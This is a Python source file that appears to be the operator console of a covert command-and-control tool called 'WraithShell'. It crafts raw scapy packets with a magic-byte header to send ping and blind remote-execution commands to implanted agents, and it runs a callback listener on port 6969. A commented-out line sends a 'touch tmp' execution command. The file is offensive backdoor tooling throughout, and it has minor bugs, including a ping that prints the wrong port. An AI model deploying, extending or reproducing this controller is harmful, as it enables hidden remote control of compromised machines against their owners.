from scapy.all import *
import sys
import socket
import struct
import random
import threading

MAGIC_BYTES = 0x0b1e55ed
C2_PORT = 6969
CMD_MAP = {"CMD_PING" : 0x01, "CMD_EXEC_BLIND" : 0x02}

PURPLE = "\033[95m"
RESET  = "\033[0m"
PROMPT = f"{PURPLE}wraith>{RESET} "

def send_packet_TCP(cmd, cmd_type, agent_ip, port):

    print("Sending via TCP")
    # Assemble header, which is [MAGIC][CMD TYPE][CMD LENGTH] all in big endian
    packet = struct.pack(">III", MAGIC_BYTES, CMD_MAP[cmd_type], len(cmd))

    # Add on payload (the cmd)
    packet += cmd.encode()

    # Craft a raw TCP packet
    pkt = IP(dst=agent_ip) / TCP(dport=port, sport=54321, flags="PA") / Raw(load=packet)

    send(pkt, verbose=False)

def send_packet_UDP(cmd, cmd_type, agent_ip, port):

    print("Sending via UDP")
    # Assemble header, which is [MAGIC][CMD TYPE][CMD LENGTH] all in big endian
    packet = struct.pack(">III", MAGIC_BYTES, CMD_MAP[cmd_type], len(cmd))

    # Add on payload (the cmd)
    packet += cmd.encode()

    # Craft a raw UDP packet
    pkt = IP(dst=agent_ip) / UDP(dport=port, sport=54321) / Raw(load=packet)

    send(pkt, verbose=False)

def start_listener():

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", C2_PORT))
    server.listen(1)

    stop_event = threading.Event()

    def _accept_loop():
        
        server.settimeout(1.0) 
        while not stop_event.is_set():
            
            try:
                conn, addr = server.accept()
            except socket.timeout:
                continue  # loop back and check stop_event
            except OSError:
                break     # socket was closed externally

            output = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                output += chunk
            conn.close()

            message = output.decode(errors="replace").strip().lower()
            if message == "pong":
                print(f"\n[+] Pong received from {addr[0]}")

            print(PROMPT, end="", flush=True)

    # Thread the accept loop
    t = threading.Thread(target=_accept_loop, daemon=True)
    t.start()

    def stop():
        stop_event.set()
        t.join(timeout=2)

    return stop

def shell():

    stop_listener = None
    
    sender_wrapper = send_packet_TCP

    while True:
        try:
            input_command = input(PROMPT).strip()
        except (EOFError, KeyboardInterrupt) as e:
            print(e)

            if stop_listener:
                stop_listener()

            print("Exiting WraithShell")
            exit()

        if not input_command:
            continue 

        input_arr = input_command.split()
        
        match input_arr[0].lower():

            # Handle ping
            case "ping":

                IP = input_arr[1]
                port = 0

                # ping <IP>
                if len(input_arr) == 2:

                    port = random.randint(1, 65535)
                    sender_wrapper("ping", "CMD_PING", IP, random.randint(1, 65535))
                    print(f"Sent ping to {IP} over port {port}")
                
                # ping <IP> <port>
                elif len(input_arr) == 3:

                    port = int(input_arr[2])
                    sender_wrapper("ping", "CMD_PING", IP, port)
                    print(f"Sent ping to {IP} over port {port}")

                else:
                    print(f"Ping usage: ping [IP] [PORT]\nPort is optional")

            # Handle server start
            case "start":


                if len(input_arr) == 2 and input_arr[1].lower() == "listener":
                    if stop_listener:
                        print("Listener is already running")
                    else:
                        print(f"Starting listener on port {C2_PORT}")
                        stop_listener = start_listener()

                else:
                    print("Start usage: start listener")

            # Handle server stop
            case "stop":


                if len(input_arr) == 2 and input_arr[1].lower() == "listener":
                    if not stop_listener:
                        print("Listener is not running")
                    
                    else:
                        print(f"Stopping listener on port {C2_PORT}")
                        stop_listener()
                        stop_listener = None

                else:
                    print("Stop usage: stop listener")

            case "protocol":

                if len(input_arr) == 2 and input_arr[1].lower() == "tcp":

                    if sender_wrapper == send_packet_TCP:
                        print("Send protocol is already TCP")

                    else:
                        sender_wrapper = send_packet_TCP
                        print("Switched send protocol to TCP")
                
                elif len(input_arr) == 2 and input_arr[1].lower() == "udp":

                    if sender_wrapper == send_packet_UDP:
                        print("Send protocol is already UDP")

                    else:
                        sender_wrapper = send_packet_UDP
                        print("Switched send protocol to UDP")

                else:
                    print("Protocol usage: protocol [tcp/ip]")

            # Handle exit
            case "exit" | "quit":
                if stop_listener:
                    stop_listener()

                print("Exiting WraithShell")
                exit()





if __name__ == "__main__":
    #send_packet("touch tmp", "CMD_EXEC_BLIND", "127.0.0.1", 1)
    shell()
